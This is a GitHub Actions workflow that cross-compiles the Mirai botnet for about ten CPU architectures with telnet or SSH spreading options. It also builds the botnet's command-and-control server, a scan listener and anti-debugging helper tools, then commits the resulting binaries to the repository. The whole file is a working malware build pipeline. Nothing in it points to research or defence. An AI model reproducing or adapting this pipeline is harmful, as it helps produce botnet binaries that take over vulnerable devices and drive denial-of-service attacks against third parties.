name: Bot Test

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up environment
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc-mips gcc-mipsel gcc-arm-linux-gnueabi gcc-arm-linux-gnueabihf gcc-powerpc gcc-sparc gcc-m68k gcc-sh4

      - name: Compile release
        env:
          BUILD_MODE: debug # debug/release
          BUILD_TYPE: telnet # ssh/telnet
        run: |
          # Function to compile bot
          compile_bot() {
            echo "Compiling $2"
            ${1}-gcc -std=c99 $3 bot/*.c -O3 -o release/"$2"
            ${1}-strip release/"$2" -S --strip-unneeded
          }

          FLAGS=""
          if [ "$BUILD_TYPE" == "telnet" ]; then
            FLAGS="-DMIRAI_TELNET"
          elif [ "$BUILD_TYPE" == "ssh" ]; then
            FLAGS="-DMIRAI_SSH"
          fi

          if [ "$BUILD_MODE" == "release" ]; then
            rm -f release/mirai.* release/miraint.*
            compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
            compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

            go build -o release/cnc cnc/*.go
            go build -o release/scanListen tools/scanListen.go
          elif [ "$BUILD_MODE" == "debug" ]; then
            gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
            gcc -std=c99 tools/enc.c -g -o debug/enc
            gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
            gcc -std=c99 tools/badbot.c -g -o debug/badbot
            go build -o debug/cnc cnc/*.go
            go build -o debug/scanListen tools/scanListen.go
          else
            echo "Unknown parameter $BUILD_MODE: debug or release required"
            exit 1
          fi

      - name: Push changes
        run: |
          git config --local user.email "you@example.com"
          git config --local user.name "Your Name"
          git add release/*
          git commit -m "Build results for $BUILD_MODE with $BUILD_TYPE"
          git push
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
